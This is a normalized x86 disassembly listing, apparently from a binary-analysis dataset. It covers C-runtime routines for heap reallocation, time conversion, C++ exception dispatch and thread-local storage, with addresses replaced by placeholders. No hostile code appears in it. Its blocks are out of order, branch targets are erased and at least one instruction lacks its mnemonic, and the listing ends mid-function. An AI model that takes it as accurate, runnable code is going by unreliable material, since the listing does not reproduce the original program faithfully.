jmp r-xdata
push esi
call sub_4144ea
pop ecx
test eax eax
jne r-xdata
cmp esi edi
jne r-xdata
cmp [ ebp - 0x24 ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_414d56
add esp 0xc
test eax eax
je r-xdata
push esi
call sub_4144ea
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov [ ebp - 0x24 ] eax
cmp esi [ rw-data ]
jae r-xdata
mov [ ebp + 0xc ] esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov [ ebp - 0x24 ] eax
push 0x1
pop esi
cmp esi edi
jne r-xdata
push esi
call sub_4148a1
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x24 ] ebx
jmp r-xdata
push esi
call sub_4144ea
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov ebx esi
shr ebx 0x4
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x38 ]
call sub_415670
add esp 0x10
test eax eax
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x24 ] eax
cmp eax edi
je r-xdata
push 0x1
pop esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
mov [ ebp - 0x20 ] eax
cmp eax esi
jb r-xdata
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_412786
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
push ebx
call sub_415344
pop ecx
mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax [ ebx - 0x4 ]
dec eax
mov [ ebp - 0x20 ] eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x24 ]
call sub_410ff0
push ebx
call sub_41454d
mov [ ebp - 0x28 ] eax
push ebx
push eax
call sub_414578
add esp 0x18
mov eax esi
movzx eax [ edi ]
shl eax 0x4
mov [ ebp - 0x34 ] eax
cmp eax esi
jb r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ edi ]
shl eax 0x4
mov [ ebp - 0x34 ] eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x24 ]
call sub_410ff0
push ebx
push [ ebp - 0x28 ]
call sub_414578
add esp 0x14
mov eax esi
push eax
push ebx
push [ ebp - 0x24 ]
call sub_410ff0
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x38 ]
call sub_4152ff
add esp 0x18
jmp r-xdata
mov eax esi
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x24 ]
call sub_410ff0
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x38 ]
call sub_4152ff
add esp 0x18
mov eax esi
sub_4127dc
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
jge r-xdata
call sub_416f75
mov eax [ esi ]
cmp eax 0x3f480
jle r-xdata
xor eax eax
jmp r-xdata
push esi
call sub_412bb3
mov esi eax
push esi
call sub_41722a
pop ecx
test eax eax
mov eax [ esi ]
pop ecx
je r-xdata
cmp eax 0x7ffc0b7f
jge r-xdata
pop esi
pop ebp
retn
sub eax [ rw-data ]
push edi
push 0x3c
mov [ ebp + 0x8 ] eax
pop ecx
cdq
mov edi ecx
idiv edi
test edx edx
mov [ esi ] edx
jge r-xdata
sub eax [ rw-data ]
sub eax [ rw-data ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_412bb3
cmp [ rw-data ] 0x0
pop ecx
mov esi eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi ecx
cdq
idiv edi
add eax [ esi + 0x4 ]
mov [ ebp + 0x8 ] eax
cdq
idiv edi
pop edi
test edx edx
mov [ esi + 0x4 ] edx
jge r-xdata
add edx ecx
mov [ esi ] edx
sub [ ebp + 0x8 ] ecx
mov eax esi
push esi
call sub_41722a
test eax eax
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x18
cdq
idiv ecx
pop ecx
add eax [ esi + 0x8 ]
mov [ ebp + 0x8 ] eax
cdq
idiv ecx
test edx edx
mov [ esi + 0x8 ] edx
jge r-xdata
add edx 0x3c
mov [ esi + 0x4 ] edx
sub [ ebp + 0x8 ] ecx
mov eax [ rw-data ]
sub [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_412bb3
mov esi eax
pop ecx
mov [ esi + 0x20 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push 0x18
cdq
pop ecx
idiv ecx
mov ecx eax
test ecx ecx
mov [ ebp + 0x8 ] ecx
jle r-xdata
add edx ecx
mov [ esi + 0x8 ] edx
sub [ ebp + 0x8 ] ecx
jge r-xdata
mov eax [ esi + 0x18 ]
push 0x7
add eax ecx
pop ecx
cdq
idiv ecx
mov [ esi + 0x18 ] edx
mov eax [ ebp + 0x8 ]
add [ esi + 0xc ] eax
mov eax [ esi + 0x18 ]
push 0x7
lea eax [ eax + ecx + 0x7 ]
pop ecx
cdq
idiv ecx
mov [ esi + 0x18 ] edx
mov eax [ ebp + 0x8 ]
add [ esi + 0xc ] eax
mov eax [ esi + 0xc ]
test eax eax
jg r-xdata
mov eax [ ebp + 0x8 ]
add [ esi + 0x1c ] eax
add eax 0x1f
dec [ esi + 0x14 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x1c ] 0x16c
mov [ esi + 0x10 ] 0xb
jmp r-xdata
sub_41293c
push esi
call sub_4129b8
mov ecx [ esp + 0x8 ]
xor esi esi
mov [ eax ] ecx
mov eax rw-data
call sub_4129af
mov ecx [ esi * 8 + rw-data ]
pop esi
mov [ eax ] ecx
retn
add eax 0x8
inc esi
cmp eax rw-data
jl r-xdata
cmp ecx [ eax ]
je r-xdata
cmp ecx 0x13
jb r-xdata
cmp ecx 0xbc
jb r-xdata
cmp ecx 0x24
ja r-xdata
call sub_4129af
mov [ eax ] 0x16
pop esi
retn
cmp ecx 0xca
ja r-xdata
call sub_4129af
mov [ eax ] 0xd
pop esi
retn
call sub_4129af
mov [ eax ] 0x8
pop esi
retn
sub_4129cf
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x14 ]
cmp ecx 0x45
jl r-xdata
or eax 0xffffffff
cmp ecx 0x8b
jg r-xdata
mov esi [ edi + 0x10 ]
test esi esi
jl r-xdata
push ebx
mov eax esi
push 0xc
cdq
pop ebx
idiv ebx
push ebx
add ecx eax
mov eax esi
cdq
pop esi
pop ebx
idiv esi
test edx edx
mov [ edi + 0x10 ] edx
jge r-xdata
cmp esi 0xb
jle r-xdata
cmp ecx 0x45
jl r-xdata
add edx 0xc
dec ecx
mov [ edi + 0x10 ] edx
mov edx [ edi + 0x10 ]
test cl 0x3
mov eax [ edx * 4 + rw-data ]
jne r-xdata
cmp ecx 0x8b
jg r-xdata
lea edx [ ecx - 0x1 ]
imul ecx ecx 0x16d
sar edx 0x2
add eax edx
lea eax [ ecx + eax - 0x63df ]
mov ecx [ edi + 0xc ]
test eax eax
lea esi [ eax + ecx ]
jl r-xdata
cmp edx 0x1
jle r-xdata
test ecx ecx
jge r-xdata
test ecx ecx
jl r-xdata
inc eax
lea ecx [ esi + esi * 2 ]
shl ecx 0x3
test esi esi
je r-xdata
test esi esi
jge r-xdata
test esi esi
jl r-xdata
xor eax eax
mov eax ecx
cdq
idiv esi
xor edx edx
cmp eax 0x18
setne dl
mov eax edx
jmp r-xdata
jmp r-xdata
mov eax [ edi + 0x8 ]
test ecx ecx
lea esi [ eax + ecx ]
jl r-xdata
test eax eax
jne r-xdata
test eax eax
jge r-xdata
test eax eax
jl r-xdata
mov ecx esi
imul ecx ecx 0x3c
test esi esi
je r-xdata
test esi esi
jge r-xdata
test esi esi
jl r-xdata
xor eax eax
mov eax ecx
cdq
idiv esi
xor edx edx
cmp eax 0x3c
setne dl
mov eax edx
jmp r-xdata
jmp r-xdata
mov eax [ edi + 0x4 ]
test ecx ecx
lea esi [ eax + ecx ]
jl r-xdata
test eax eax
jne r-xdata
test eax eax
jge r-xdata
test eax eax
jl r-xdata
mov ecx esi
imul ecx ecx 0x3c
test esi esi
je r-xdata
test esi esi
jge r-xdata
test esi esi
jl r-xdata
xor eax eax
mov eax ecx
cdq
idiv esi
xor edx edx
cmp eax 0x3c
setne dl
mov eax edx
jmp r-xdata
jmp r-xdata
mov eax [ edi ]
test ecx ecx
lea edx [ eax + ecx ]
mov [ ebp + 0x8 ] edx
jl r-xdata
test eax eax
jne r-xdata
test eax eax
jge r-xdata
test eax eax
jl r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
test edx edx
jge r-xdata
test edx edx
jl r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_412bb3
test eax eax
pop ecx
je r-xdata
call sub_416f75
mov eax [ rw-data ]
add [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_4127dc
test eax eax
pop ecx
je r-xdata
jmp r-xdata
push 0x9
mov esi eax
mov eax [ ebp + 0x8 ]
pop ecx
[ edi ] [ esi ]
jmp r-xdata
mov ecx [ edi + 0x20 ]
test ecx ecx
jg r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ rw-data ]
add [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_4127dc
pop ecx
jmp r-xdata
jge r-xdata
cmp [ eax + 0x20 ] 0x0
jle r-xdata
sub_412bb3
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
mov esi [ eax ]
xor ebx ebx
call sub_413593
test esi esi
mov edi eax
jge r-xdata
cmp [ edi + 0x40 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx [ edi + 0x40 ]
push 0x24
call sub_410b8c
pop ecx
mov [ edi + 0x40 ] eax
test eax eax
mov ecx rw-data
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov [ ecx + 0x14 ] edx
cdq
mov edi 0x15180
idiv edi
mov edi rw-data
mov [ ecx + 0x1c ] eax
imul eax eax 0xfffeae80
add esi eax
test ebx ebx
jne r-xdata
sub esi eax
inc edx
cmp esi eax
jl r-xdata
mov eax esi
mov edi 0x7861f80
cdq
idiv edi
mov edx eax
imul edx edx 0xf879e080
add esi edx
lea edx [ eax * 4 + 0x46 ]
mov eax 0x1e13380
cmp esi eax
jl r-xdata
mov edx [ ecx + 0x1c ]
push 0x1
pop eax
lea ebx [ edi + 0x4 ]
mov edi rw-data
sub esi eax
mov eax 0x1e28500
inc edx
cmp esi eax
jl r-xdata
mov edx [ ecx + 0x1c ]
dec eax
mov [ ecx + 0x10 ] eax
push 0x7
sub edx [ edi + eax * 4 ]
mov eax [ esp + 0x14 ]
mov edi 0x15180
mov [ ecx + 0xc ] edx
mov eax [ eax ]
cdq
idiv edi
pop edi
push 0x3c
add eax 0x4
cdq
idiv edi
mov eax esi
mov edi 0xe10
mov [ ecx + 0x18 ] edx
cdq
idiv edi
pop edi
mov [ ecx + 0x8 ] eax
imul eax eax 0xfffff1f0
add esi eax
mov eax esi
cdq
idiv edi
mov [ ecx + 0x4 ] eax
imul eax eax 0x3c
sub esi eax
and [ ecx + 0x20 ] 0x0
mov [ ecx ] esi
mov eax ecx
inc eax
add ebx 0x4
jmp r-xdata
push 0x1
pop ebx
inc edx
sub esi eax
jmp r-xdata
cmp [ ebx ] edx
jge r-xdata
sub_412cbd
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi 0x19930520
cmp [ esi ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
je r-xdata
call sub_41365b
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
push 0x1
pop eax
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_412d58
add esp 0x20
cmp [ eax + 0x14 ] edi
jbe r-xdata
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_413012
add esp 0x10
jmp r-xdata
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
movzx edx [ ebp + 0x24 ]
push edx
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call ecx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_412d58
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov eax [ eax + 0x8 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jl r-xdata
call sub_41365b
mov ecx [ ebp + 0x18 ]
cmp eax [ ecx + 0x4 ]
jl r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0xe06d7363
push edi
mov edi 0x19930520
cmp [ esi ] ebx
jne r-xdata
jmp sub_4135fa
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_412f0b
add esp 0x20
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
call sub_413593
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov edi [ ebp - 0x10 ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_4103b5
add esp 0x14
mov ebx eax
call sub_413593
mov esi [ eax + 0x6c ]
call sub_413593
mov eax [ eax + 0x70 ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x14 ] 0x1
call sub_417610
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
cmp [ ebx ] edi
jg r-xdata
cmp [ esi ] ebx
jne r-xdata
call sub_41365b
push 0x1
push esi
call sub_41344a
pop ecx
pop ecx
inc [ ebp - 0x4 ]
add ebx 0x14
jmp r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx + 0xc ]
test eax eax
mov [ ebp - 0xc ] eax
jle r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x8 ] eax
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
dec [ ebp - 0xc ]
add [ ebp + 0x8 ] 0x10
cmp [ ebp - 0xc ] 0x0
jg r-xdata
push [ esi + 0x1c ]
push [ edi ]
push [ ebp + 0x8 ]
call sub_412fb5
add esp 0xc
test eax eax
jne r-xdata
call sub_41365b
jmp r-xdata
push [ ebp - 0x14 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ edi ]
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4130c6
add esp 0x2c
dec [ ebp - 0x8 ]
add edi 0x4
cmp [ ebp - 0x8 ] eax
jg r-xdata
sub_412f0b
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
call sub_413593
cmp [ eax + 0x68 ] 0x0
je r-xdata
mov edi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_4103b5
add esp 0x14
mov esi eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41028a
add esp 0x1c
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
cmp edi [ esi ]
jl r-xdata
inc [ ebp - 0x4 ]
add esi 0x14
jmp r-xdata
cmp edi [ esi + 0x4 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
push 0x1
add eax 0xfffffff0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4130c6
add esp 0x2c
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
sub_412fb5
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x1
pop eax
cmp [ eax + 0x8 ] 0x0
lea edx [ eax + 0x8 ]
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_413750
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
retn
test [ edi ] 0x2
jne r-xdata
sub_413012
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0x8 ]
mov [ ebp - 0x1c ] esi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jle r-xdata
call sub_41365b
cmp esi [ edi + 0x4 ]
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x103
push ebx
push eax
call sub_4134e0
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
mov eax [ eax + esi * 8 + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
mov esi [ eax + esi * 8 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_4130c6
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_413286
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push edi
push eax
call sub_41014a
call sub_41018c
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_413012
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
push [ ebx + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_413141
add esp 0x2c
test eax eax
je r-xdata
sub_413141
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x2c ] ebx
and [ ebp - 0x24 ] 0x0
mov esi [ ebp + 0xc ]
mov eax [ esi - 0x4 ]
mov [ ebp - 0x28 ] eax
call sub_413593
mov eax [ eax + 0x6c ]
mov [ ebp - 0x1c ] eax
call sub_413593
mov eax [ eax + 0x70 ]
mov [ ebp - 0x20 ] eax
call sub_413593
mov edi [ ebp + 0x8 ]
mov [ eax + 0x6c ] edi
call sub_413593
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x70 ] ecx
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push [ ebp + 0x14 ]
push esi
call sub_410211
add esp 0x14
mov [ ebp - 0x2c ] eax
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
call sub_41320e
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_41320e
mov eax [ ebp - 0x28 ]
mov [ esi - 0x4 ] eax
call sub_413593
mov ecx [ ebp - 0x1c ]
mov [ eax + 0x6c ] ecx
call sub_413593
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x70 ] ecx
cmp [ edi ] 0xe06d7363
jne r-xdata
retn
cmp [ edi + 0x10 ] 0x3
jne r-xdata
cmp [ edi + 0x14 ] 0x19930520
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
call sub_4104da
push eax
push edi
call sub_41344a
pop ecx
pop ecx
sub_41325c
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_413286
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
lea edi [ eax + edx + 0xc ]
and [ ebp - 0x4 ] 0x0
test [ ecx ] 0x8
je r-xdata
mov esi [ ebp + 0x14 ]
test [ esi ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1
push [ esi + 0x18 ]
call sub_417610
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] 0x0
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
call sub_417610
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_41365b
push 0x1
push edi
call sub_41762c
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_417610
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_417610
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_41762c
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
mov [ edi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push 0x1
push edi
call sub_41762c
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_41762c
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
push [ ebx + 0x18 ]
push edi
call sub_411580
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push [ esi + 0x18 ]
call sub_417648
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
add esi 0x8
push esi
push [ ebx + 0x18 ]
call sub_4134b1
pop ecx
pop ecx
push eax
push edi
call sub_411580
add esp 0xc
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
test [ esi ] 0x4
je r-xdata
add esi 0x8
push esi
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_4134b1
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_41017e
jmp r-xdata
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_4134b1
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_410185
jmp r-xdata
push eax
call sub_4134b1
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_41344a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
push ecx
push [ eax + 0x18 ]
call sub_41017e
or [ ebp - 0x4 ] 0xffffffff
sub_4134b1
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
add eax esi
test edx edx
jl r-xdata
pop esi
retn
mov esi [ edx + esi ]
mov ecx [ ecx + 0x8 ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_4134e0
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_4104fd
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_4104fd
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_41352c
push esi
call sub_4136b1
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
xor eax eax
pop esi
retn
push 0x74
push 0x1
call sub_415ce0
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_413580
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
push 0x1
mov [ esi ] eax
pop eax
pop esi
retn
sub_413593
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
mov eax esi
pop edi
pop esi
retn
push 0x74
push 0x1
call sub_415ce0
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push 0x10
call sub_41098a
pop ecx
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_413580
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_4135fa
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x4 ] esi
call sub_413593
cmp [ eax + 0x60 ] esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
call sub_413593
call [ eax + 0x60 ]
mov [ ebp - 0x4 ] esi
jmp r-xdata
push 0xa
call sub_414333
push 0x16
call sub_418640
pop ecx
pop ecx
push 0x3
call sub_411442
sub_41365b
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
